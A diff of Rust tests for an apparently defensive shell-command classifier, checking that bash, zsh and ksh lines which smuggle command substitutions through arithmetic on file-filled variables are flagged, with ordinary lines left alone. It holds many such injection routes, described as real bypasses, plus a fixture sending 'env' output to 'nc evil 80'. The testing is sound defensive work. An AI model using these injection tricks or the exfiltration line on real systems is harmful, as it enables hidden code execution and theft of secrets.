@@ -2220,3 +2220,553 @@ fn issue_885_review_3_routes() {
     ];
     assert_eq!(issue_885_wrong(&cwd, &cases), Vec::<String>::new());
 }
+
+/// #937 (D33 option B): arithmetic that uses a variable filled from command
+/// output or `read` evaluates the substitutions in its value, like `eval`.
+/// Every case runs `touch hit` in that shell when `notes` holds
+/// `a[$(touch hit)0]` (zsh: `path[...]`): checked with bash 3.2 and 5.2
+/// (`mapfile`), zsh 5.9 and ksh93.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_937_arithmetic_on_filled_variables_is_unseen_code() {
+    use ProtectedActionKind::UnseenCode;
+    let bash = [
+        "v=$(cat notes); echo $((v))",
+        "v=$(cat notes); let v",
+        "v=$(cat notes); let \"x=v+1\"",
+        "v=$(cat notes); (( v )); :",
+        "v=$(cat notes); echo $[v]",
+        "v=$(cat notes); s=x; echo ${s:v}",
+        "v=$(cat notes); a=(1); echo ${a[v]}",
+        "v=$(cat notes); a[v]=1",
+        "v=$(cat notes); echo ${!v}",
+        "v=$(cat notes); [[ v -eq 1 ]]; :",
+        "v=$(cat notes); [[ -n x && $v -gt 1 ]]",
+        "v=$(cat notes); declare -i n; n=v",
+        "v=$(cat notes); declare -i n=v",
+        "declare -i n; n=$(cat notes)",
+        "declare -i n; read n < notes",
+        "v=$(cat notes); declare \"$v\"=1",
+        "v=$(cat notes); read \"$v\" <<< 1",
+        "a=(1); v=$(cat notes); unset \"$v\"",
+        "v=$(cat notes); r=v; echo $((r))",
+        "v=$(cat notes); for ((i=v; i<0; i++)); do :; done",
+        "v=$(cat notes); set -- \"$v\"; echo $(( $1 ))",
+        "f() { echo $(( $1 )); }; v=$(cat notes); f \"$v\"",
+        "v=`cat notes`; echo $((v))",
+        "export v=$(cat notes); echo $((v + 1))",
+        "c=let; v=$(cat notes); $c v",
+        "read v < notes; echo $((v))",
+        "while read -r v; do echo $((v)); done < notes",
+        "cat notes | while IFS= read -r line; do ((line)); done",
+        "mapfile -t lines < notes; echo $(( lines[0] ))",
+        "for v in \"$(cat notes)\"; do echo $((v)); done",
+        "echo $(( $(cat notes) + 1 ))",
+        // A command substitution that starts `$((` is not arithmetic.
+        "v=$(((1));cat notes); echo $((v))",
+        "v=$(cat notes); eval let v",
+        "v=$(cat notes); printf -v n '%s' \"$v\"; echo $((n))",
+        "shopt -s expand_aliases; v=$(cat notes); alias L=let\nL v",
+    ];
+    let zsh = [
+        "v=$(cat notes); echo $((v))",
+        "v=$(cat notes); a=(1); echo $a[v]",
+        "v=$(cat notes); print -f '%d' \"$v\"",
+        "v=$(cat notes); printf '%*s' v x",
+        "v=$(cat notes); repeat v; do :; done",
+        "v=$(cat notes); for i in 1; do break v; done",
+        "v=$(cat notes); exit v",
+        "v=$(cat notes); echo ${(l:v:)s}",
+        "v=$(cat notes); vared \"$v\"",
+        "v=$(cat notes); [[ -v $v ]]",
+        "v=$(cat notes); test -v \"$v\"",
+        "v=$(cat notes); export \"$v\"=1",
+        "v=$(cat notes); printf -v \"$v\" x",
+        "v=$(cat notes); local \"$v\"",
+        "v=$(cat notes); integer n; n=v",
+        "read v < notes; set -- \"$v\"; shift \"$1\"",
+        "v=$(cat notes); noglob let v",
+        "for a b in \"$(cat notes)\" x; do echo $((a)); done",
+    ];
+    let ksh = [
+        "v=$(cat notes); [ \"$v\" -eq 1 ]",
+        "v=$(cat notes); read -t v x <<< 1",
+        "v=$(cat notes); ulimit -n \"$v\"",
+    ];
+    // Nested in another shell's script, too.
+    let nested = [
+        "bash -c 'v=$(cat notes); echo $((v))'",
+        "zsh -c \"v=\\$(cat notes); echo \\$((v))\"",
+    ];
+    let mut wrong = Vec::new();
+    for line in nested {
+        let found = kind(&["bash", "-lc", line]);
+        if found != Some(UnseenCode) {
+            wrong.push(format!("nested: {line} -> {found:?}"));
+        }
+    }
+    for (shell, lines) in [("bash", &bash[..]), ("zsh", &zsh[..]), ("ksh", &ksh[..])] {
+        for line in lines {
+            let found = kind(&[shell, "-c", line]);
+            if found != Some(UnseenCode) {
+                wrong.push(format!("{shell}: {line} -> {found:?}"));
+            }
+        }
+    }
+    assert_eq!(wrong, Vec::<String>::new());
+}
+
+/// #937: loop counters, values from literals or from commands the
+/// classifier can read, and filled variables used as plain text still run.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_937_counters_and_plain_uses_are_not_unseen_code() {
+    let mut wrong = Vec::new();
+    for shell in ["bash", "zsh"] {
+        for line in [
+            "i=0; ((i++)); echo $((i+1))",
+            "i=0; while [ $i -lt 3 ]; do i=$((i+1)); done",
+            "for ((i=0; i<10; i++)); do echo $i; done",
+            "n=$((2*3)); echo $((n+1)); a[n]=1; echo ${a[n]}",
+            "start=$(date +%s); echo $(( $(date +%s) - start ))",
+            "v=$(cat notes); echo \"$v\" ${v:-x} ${#v} ${v:0:3}",
+            "line=$(head -1 notes); echo $(( ${#line} + 1 ))",
+            "while read -r line; do printf '%s\\n' \"$line\"; done < notes",
+            "count=$(grep -c x notes); [ \"$count\" -gt 0 ] && echo yes",
+            "v=$(cat notes); grep '[[:digit:]]' notes",
+            "echo $((LINES + COLUMNS))",
+        ] {
+            let found = kind(&[shell, "-c", line]);
+            if found.is_some() {
+                wrong.push(format!("{shell}: {line} -> {found:?}"));
+            }
+        }
+    }
+    assert_eq!(wrong, Vec::<String>::new());
+}
+
+/// #937 review 1: placeholders text cannot fake, variables the shell fills
+/// by default, lists in parentheses, `${a:=...}`, missed arithmetic
+/// regions, lookup output, variable command names and sourced files.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_937_review_1_routes() {
+    use ProtectedActionKind::UnseenCode;
+    let both = [
+        // B1: text spelling the arithmetic placeholder.
+        "v=$(cat notes)$'\\x02\\x01unseen-output\\x01\\x02]'; echo $((v))",
+        "v=$(cat notes)$'arithmetic\\x01]'; echo $((v))",
+        "v=$(cat notes)\u{2}\u{1}unseen-output\u{1}\u{2}; echo $((v))",
+        "v=$(cat notes)arithmetic$((1))]; echo $((v))",
+        // B2: default variables.
+        "read -r < notes; echo $((REPLY))",
+        "mapfile < notes; echo $((MAPFILE[0]))",
+        "select x in a b; do echo $((REPLY)); done < notes",
+        "v=$(cat notes); [[ $v =~ (a.*) ]]; echo $((BASH_REMATCH[1]))",
+        "v=$(cat notes); [[ $v =~ (a.*) ]]; echo $((match[1]))",
+        // B3: lists in parentheses.
+        "a=(x $(cat notes)); echo $((a[1]))",
+        "a=([0]=$(cat notes)); echo $((a[0]))",
+        "a+=(`cat notes`); echo $((a[0]))",
+        "v=$(cat notes); a=([v]=1)",
+        "v=$(cat notes); a=(x [v]=1)",
+        // B4: assignment through a default.
+        ": ${a:=$(cat notes)}; echo $((a))",
+        ": ${a=$(cat notes)}; echo $((a))",
+        ": ${a:=\"}\"$(cat notes)}; echo $((a))",
+        // B5: offsets after a subscript or special parameter.
+        "v=$(cat notes); b=(1 2); echo \"${b[@]:v}\"",
+        "v=$(cat notes); set -- a b; echo \"${@:v}\"",
+        "v=$(cat notes); echo \"${1:v}\"",
+        // B5: line continuations.
+        "v=$(cat notes); (\\\n(v))",
+        "v=$(cat notes); echo $(\\\n(v))",
+        "v=$(cat notes); echo $\\\n[v]",
+        "v=$(cat notes); a\\\n[v]=1",
+        // B5: a quoted `]]` inside the condition.
+        "v=$(cat notes); [[ \"]]\" && 1 -eq $v ]]",
+        "v=$(cat notes); [[ \"$(echo \" ]] \")\" && 1 -eq $v ]]",
+        "v=$(cat notes); [[ $'\\']]' && 1 -eq $v ]]",
+        // B6: what a lookup printed.
+        "v=$(readlink link); echo $((v))",
+        "v=$(realpath link); echo $((v))",
+        "v=$(basename *); echo $((v))",
+        "for v in $(which x); do echo $((v)); done",
+        // Should-fix: a command named by a variable, a sourced file.
+        "c='let v'; v=$(cat notes); $c",
+        "v=$(cat notes); . ./lib.sh",
+        "v=$(cat notes); source ./lib.sh",
+    ];
+    let zsh = [
+        "set -A a x $(cat notes); echo $((a[2]))",
+        "for x (0 $(cat notes)) echo $((x))",
+        "foreach x (0 $(cat notes)) echo $((x)); end",
+        ": ${a::=$(cat notes)}; echo $((a))",
+    ];
+    let mut wrong = Vec::new();
+    for shell in ["bash", "zsh"] {
+        for line in both
+            .iter()
+            .chain(if shell == "zsh" { &zsh[..] } else { &[] })
+        {
+            let found = kind(&[shell, "-c", line]);
+            if found != Some(UnseenCode) {
+                wrong.push(format!("{shell}: {line:?} -> {found:?}"));
+            }
+        }
+    }
+    assert_eq!(wrong, Vec::<String>::new());
+}
+
+/// #937 review 1: everyday lines near the new routes still run.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_937_review_1_everyday_lines_still_run() {
+    let mut wrong = Vec::new();
+    for shell in ["bash", "zsh"] {
+        for line in [
+            ": ${PORT:=8080}; echo $((PORT + 1))",
+            "a=(1 2 3); echo $((a[1] + 1)); a+=(4)",
+            "x=12; [[ $x =~ ^([0-9]+)$ ]] && echo yes",
+            "b=(1 2); echo \"${b[@]:1}\" \"${@:2}\"",
+            "i=0; (( \\\ni++ ))",
+            "[[ \"]]\" == x ]] && echo $((1 + 2))",
+            "d=$(dirname \"$0\"); cd \"$d\" && ls",
+            "v=$(cat notes); echo \"[$v]\"",
+            "workshop=1; echo $((workshop))",
+        ] {
+            let found = kind(&[shell, "-c", line]);
+            if found.is_some() {
+                wrong.push(format!("{shell}: {line:?} -> {found:?}"));
+            }
+        }
+    }
+    assert_eq!(wrong, Vec::<String>::new());
+}
+
+/// #937 review 2: built names, integer specials, `for x;`, more fill
+/// sources and decoding `printf`, end to end.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_937_review_2_routes() {
+    use ProtectedActionKind::UnseenCode;
+    let both = [
+        // N3: names built by quote removal or expansion.
+        "var=$(cat notes); ((va\"\"r)); :",
+        "var=$(cat notes); a[va''r]=1",
+        "var=$(cat notes); x=va; echo $(( 1 + ${x}r ))",
+        "var=$(cat notes); x=va; y=${x}r; echo $(( 1 + y ))",
+        "var=$(cat notes); x=v; x+=ar; echo $(( 1 + $x ))",
+        "var=$(cat notes); x=zvar; echo $(( 1 + ${x#z} ))",
+        "var=$(cat notes); x=va; let \"1+${x}r\"",
+        // N4: special parameters that evaluate on assignment.
+        "v=$(cat notes); OPTIND=$v",
+        "v=$(cat notes); SECONDS=$v",
+        // N5: `for x;` takes `"$@"`.
+        "set -- \"$(cat notes)\"; for x; do echo $((x)); done",
+        "f(){ for x; do echo $((x)); done; }; f \"$(cat notes)\"",
+        // N6: more fill sources.
+        ": ${b[0]:=$(cat notes)}; echo $((b[0]))",
+        // N7: output that `printf`/`echo` decode.
+        "v=$(printf 'a[\\x24\\x28cmd\\x290]'); echo $((v))",
+        "v=$(printf '%s%s' a b); echo $((v))",
+        // Should-fix: a decoded value holding a substitution.
+        "v=$'a[\\x24\\x28cmd\\x290]'; echo $((v))",
+        // Review 3: joins across quotes, `printf -v`, IFS joins, namerefs.
+        "var=$(cat notes); n=va; m=\"$n\"r; echo $((m))",
+        "var=$(cat notes); n=va; m=$n\\r; echo $((m))",
+        "var=$(cat notes); printf -v n %s%s va r; echo $((n))",
+        "var=$(cat notes); a=(va r); IFS=; m=\"${a[*]}\"; echo $((m))",
+        "var=$(cat notes); set -- va r; IFS=; m=\"$*\"; echo $((m))",
+        "v=${ cat notes; }; echo $((v))",
+        "v=$(cat notes); declare -n r=$v; echo $r",
+        // Review 4.
+        ": \"$(cat notes)\"; echo $((_))",
+        "v=$(cat notes); declare -n r; r=$v; echo $r",
+        "var=$(cat notes); declare -u m; m=var; echo $((m))",
+        // Review 5.
+        "v=$(cat notes); eval \\(\\(v\\)\\)",
+        "v=$(cat notes); eval $'let \\x76'",
+        "printf -vm %s \"$(cat notes)\"; echo $((m))",
+        "read -raarr < notes; echo $((arr))",
+        "p=$(pwd); b=${p##*/}; echo $((b))",
+    ];
+    let zsh = [
+        "x=VAR; var=$(cat notes); echo $(( 1 + ${(L)x} ))",
+        "read 'v?prompt' < notes; echo $((v))",
+        "zmodload zsh/system; sysread < notes; echo $((REPLY))",
+        "v=$(cat notes); [[ $v = (#b)(*) ]]; echo $((match[1]))",
+        "v=$(cat notes); KEYTIMEOUT=$v",
+        "zmodload zsh/mapfile; v=$mapfile[notes]; echo $((v))",
+        // Review 4.
+        "var=$(cat notes); x=VAR; m=$x:l; echo $((m))",
+        "var=$(cat notes); a=(va); m=$a[1]r; echo $((m))",
+        "v=$(cat notes); zstyle :x y \"$v\"; zstyle -s :x y m; echo $((m))",
+        "v=$(cat notes); print -z -- \"$v\"; getln m; echo $((m))",
+        "var=$(cat notes); typeset -T M m a; m=(v r); echo $((M))",
+        "set -- \"$(cat notes)\"; echo $((argv[1]))",
+        // Review 5.
+        "w=$(cat notes); UID=$w",
+        "print -z -- \"$(cat notes)\"; getln m; echo $((m))",
+        "v=$(cat notes); () { echo $(( $2 )) } x \"$v\"",
+    ];
+    let mut wrong = Vec::new();
+    for shell in ["bash", "zsh"] {
+        for line in both
+            .iter()
+            .chain(if shell == "zsh" { &zsh[..] } else { &[] })
+        {
+            let found = kind(&[shell, "-c", line]);
+            if found != Some(UnseenCode) {
+                wrong.push(format!("{shell}: {line:?} -> {found:?}"));
+            }
+        }
+    }
+    assert_eq!(wrong, Vec::<String>::new());
+}
+
+/// #937 review 2: everyday lines near the new routes still run.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_937_review_2_everyday_lines_still_run() {
+    let mut wrong = Vec::new();
+    for shell in ["bash", "zsh"] {
+        for line in [
+            "git commit -m \"Fix café (v2)\"",
+            "echo \"done ✓ (ok)\"",
+            "python3 -c \"print('✓ (x)')\"",
+            "x=va; echo \"${x}r\"; echo $(( 1 + ${#x} ))",
+            "while getopts ab: opt; do :; done; shift $((OPTIND-1))",
+            "OPTIND=1; for x in 1 2; do echo $((x)); done",
+            "f=$(mktemp); read -r x < \"$f\"",
+            "v=$(echo 5); echo $((v+1))",
+            "v=$(cat f); n=3; m=$n; k=$((m+1)); rc=$?; echo $(( n + m + k + rc ))",
+            "v=$(cat f); w=${#v}; ((w > 2)) && echo long",
+            "out=$(cmd); arr=(1 2); n=${#arr[@]}; echo $((n-1))",
+            "out=$(cmd); n=1; m=2; (( n + m )); echo $(( n * m ))",
+            &format!("echo \"${{a[{}é]}}\"", "x".repeat(254)),
+        ] {
+            let found = kind(&[shell, "-c", line]);
+            if found.is_some() {
+                wrong.push(format!("{shell}: {line:?} -> {found:?}"));
+            }
+        }
+    }
+    assert_eq!(wrong, Vec::<String>::new());
+}
+
+/// #937 review round 6, and the fallback it triggered: once a line holds
+/// command output, arithmetic may read only variables whose every value is
+/// a number or an arithmetic result, and `eval`/alias text is unseen. Each
+/// bypass ran its payload in that real shell.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_937_review_6_fallback_routes() {
+    use ProtectedActionKind::UnseenCode;
+    let mut wrong = Vec::new();
+    for (shell, line) in [
+        ("bash", "v=$(cat notes); eval \"(\"\"(v))\""),
+        ("bash", "v=$(cat notes); eval 'a''[v]=1'"),
+        ("bash", "v=$(cat notes); eval 'echo $''[v]'"),
+        ("bash", "v=$(cat notes); c=\"(\"\"(v))\"; eval \"$c\""),
+        ("ksh", "v=$(cat notes); c=\\(\\(v\\)\\); eval \"$c\""),
+        (
+            "bash",
+            "shopt -s expand_aliases; v=$(cat notes); alias L=\\(\\(v\\)\\)\nL",
+        ),
+        ("zsh", "print -rv m \"$(cat notes)\"; echo $((m))"),
+        ("zsh", "print -rvm \"$(cat notes)\"; echo $((m))"),
+        ("zsh", "m=0; print -rvm \"$(cat notes)\"; echo $((m))"),
+        (
+            "zsh",
+            "v=$(cat notes); function () { echo $(( $2 )) } x \"$v\"",
+        ),
+        ("zsh", "v=$(cat notes); () (echo $(( $2 ))) x \"$v\""),
+        (
+            "zsh",
+            "v=$(cat notes); function () (echo $(( $2 ))) x \"$v\"",
+        ),
+        ("bash", "out=$(cat notes); echo $((m))"),
+        ("bash", "out=$(cat notes); x=$1; echo $((x))"),
+        ("zsh", "fmt=%d; v=$(cat notes); printf \"$fmt\" \"$v\""),
+        ("bash", "out=$(cat notes); bash -c '(''(m))'"),
+        // Review of the fallback (round 7).
+        ("zsh", "set -sA i \"$(cat notes)\"; (( i++ ))"),
+        ("zsh", "set -sA i \"$(cat notes)\"; echo $(( i = i + 1 ))"),
+        ("zsh", "v=$(cat notes); f g () { (( argv++ )); }; f \"$v\""),
+        ("zsh", "set -sA foo \"$(cat notes)\"; let -foo"),
+        ("zsh", "w=$(cat notes); print -l /*([w])"),
+        ("bash", "v=$(cat notes); n=$(date +\"$v\"); echo $((n))"),
+        (
+            "bash",
+            "v=$(cat notes); n=$(git rev-parse --no-revs \"$v\"); echo $((n))",
+        ),
+        // D57: any glob-qualifier list on a line holding command output.
+        ("zsh", "w=$(cat notes); print -l /*(.[w])"),
+        ("zsh", "w=$(cat notes); print -l /*(om[w])"),
+        ("zsh", "w=$(cat notes); print -l /etc/passwd(.[w])"),
+        ("zsh", "w=$(cat notes); print -l /*(#q.[w])"),
+        ("zsh", "q=$(cat notes); print -l /*(${~q})"),
+        ("zsh", "w=$(cat notes); zsh -c $'print -l /*\\x28.[w])'"),
+        (
+            "zsh",
+            "w=$(cat notes); echo $(( $(print -l /*(.[w]) | wc -l) ))",
+        ),
+    ] {
+        let found = kind(&[shell, "-c", line]);
+        if found != Some(UnseenCode) {
+            wrong.push(format!("{shell}: {line:?} -> {found:?}"));
+        }
+    }
+    for shell in ["bash", "zsh"] {
+        for line in [
+            "out=$(cmd); for ((i=0; i<3; i++)); do echo $i; done",
+            "out=$(cmd); n=$(nproc); make -j$((n+1))",
+            "out=$(cmd); start=$(date +%s); echo $(( $(date +%s) - start ))",
+            "out=$(cmd); grep -E 'foo[0-9]+' f; ls file[ab].txt",
+            "out=$(cmd); [[ -f foo.txt && -n $out ]]",
+            "out=$(cmd); printf 'Found %d\\n' 3",
+            "out=$(cmd); i=0; j=$i; ((j++)); echo $((i+j))",
+            "out=$(cmd); for i in 1 2 3; do echo $((i*2)); done",
+            "out=$(cmd); echo ${out:0:80} ${#out}",
+            "out=$(cmd); rc=$?; exit $rc",
+            "out=$(cmd); n=0; while [[ $n -lt 3 ]]; do n=$((n+1)); done",
+            "out=$(cmd); arr=(1 2); diff <(echo a) <(echo b); echo ${out:(-3)}",
+        ] {
+            let found = kind(&[shell, "-c", line]);
+            if found.is_some() {
+                wrong.push(format!("{shell}: {line:?} -> {found:?}"));
+            }
+        }
+    }
+    assert_eq!(wrong, Vec::<String>::new());
+}
+
+/// #1020: the shell reader stops nesting substitutions past a depth, so deep
+/// nesting stays fast, and the line asks.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1020_deep_substitutions_stay_fast_and_ask() {
+    use ProtectedActionKind::*;
+    let lex = |text: &str| shell::simple_commands(&["bash".into(), "-c".into(), text.into()]);
+    let start = std::time::Instant::now();
+    for opener in ["$(", "<(", ">(", "$(( $("] {
+        let deep = format!("echo {}", opener.repeat(2_000));
+        assert!(lex(&deep).too_deep, "{opener}");
+    }
+    let closed = format!("echo {}x{}", "$(echo ".repeat(2_000), ")".repeat(2_000));
+    assert!(lex(&closed).too_deep);
+    // Backticks alternate open and close, so they never nest deeply.
+    assert!(!lex(&"`echo ".repeat(4_000)).too_deep);
+    // Many substitutions side by side are not deep.
+    let wide = "echo $(echo a);".repeat(10_000);
+    assert!(!lex(&wide).too_deep);
+    let mut nested_wide = String::from("echo $(");
+    nested_wide.push_str(&"$(echo a) ".repeat(10_000));
+    nested_wide.push(')');
+    assert!(!lex(&nested_wide).too_deep);
+    assert!(start.elapsed() < std::time::Duration::from_secs(10));
+    // At the limit the reader still reads; past it the line asks.
+    let at = |depth: usize| format!("echo {}hi{}", "$(echo ".repeat(depth), ")".repeat(depth));
+    assert!(!lex(&at(shell::MAX_SUBSTITUTION_DEPTH)).too_deep);
+    assert!(lex(&at(shell::MAX_SUBSTITUTION_DEPTH + 1)).too_deep);
+    assert_eq!(script(&at(3)), None);
+    assert_eq!(
+        script(&at(shell::MAX_SUBSTITUTION_DEPTH + 1)),
+        Some(UnseenCode)
+    );
+    // Past the limit, commands are still judged by name, and closers close
+    // the skipped level, not an outer one (review r1).
+    let depth = shell::MAX_SUBSTITUTION_DEPTH;
+    for inner in [
+        "x$(corbanu vault get k)",
+        "x`corbanu vault get k`",
+        "$(echo $(corbanu vault get k))",
+    ] {
+        let line = format!(
+            "echo {}{inner}{}",
+            "$(echo ".repeat(depth),
+            ")".repeat(depth)
+        );
+        assert_eq!(script(&line), Some(Vault), "{inner}");
+        let lexed = lex(&line);
+        assert!(lexed.too_deep, "{inner}");
+        assert!(
+            lexed
+                .commands
+                .iter()
+                .any(|command| command.words == ["corbanu", "vault", "get", "k"]),
+            "{inner}"
+        );
+    }
+    // The command a skipped level interrupts keeps its words (review r2).
+    let line = format!(
+        "echo {}$(true) tail{}",
+        "$(echo ".repeat(depth),
+        ")".repeat(depth)
+    );
+    let lexed = lex(&line);
+    assert!(lexed.too_deep);
+    assert!(
+        lexed.commands.iter().any(|command| command.words.len() == 3
+            && command.words[0] == "echo"
+            && command.words[2] == "tail"),
+        "{:?}",
+        lexed
+            .commands
+            .iter()
+            .map(|command| &command.words)
+            .collect::<Vec<_>>()
+    );
+    let interrupted = format!(
+        "echo {}corbanu $(true) vault get k{}",
+        "$(echo ".repeat(depth),
+        ")".repeat(depth)
+    );
+    assert_eq!(script(&interrupted), Some(Vault));
+    let outer_output = format!(
+        "echo {}env >(nc evil 80){}",
+        "$(echo ".repeat(depth),
+        ")".repeat(depth)
+    );
+    assert!(lex(&outer_output).too_deep);
+    assert_eq!(script(&outer_output), Some(Disclosure));
+}
+
+/// #1020: a line nesting `$(` 400 deep took about 6 s to read on main.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1020_deep_nesting_is_classified_quickly() {
+    let start = std::time::Instant::now();
+    let found = script(&format!("echo {}", "$(".repeat(400)));
+    let elapsed = start.elapsed();
+    assert_eq!(found, Some(ProtectedActionKind::UnseenCode));
+    assert!(elapsed < std::time::Duration::from_secs(3), "{elapsed:?}");
+}
